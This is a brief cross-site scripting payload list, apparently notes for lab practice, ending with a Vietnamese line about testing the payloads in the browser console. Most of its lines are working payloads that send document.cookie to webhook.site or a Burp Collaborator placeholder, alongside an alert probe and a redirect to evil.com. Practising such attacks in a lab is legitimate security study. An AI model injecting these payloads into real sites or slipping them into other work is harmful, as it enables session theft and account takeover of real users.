```
[XSS](javascript:window.onerror=window.location='https://webhook.site/09731cdb-80b0-47e8-a057-f86e939f1ad9?'+document.cookie)
<script>new Image().src="https://webhook.site/15665075-b653-4dc7-bdc2-10b1ace815cf?cookie="+document.cookie</script>
<script>fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {method: 'POST',mode: 'no-cors',body:document.cookie});</script>
<script>alert("XSS")</script>
<script>window.location.href="https://evil.com"</script>
```
# Sử dụng console trên browser để lab playload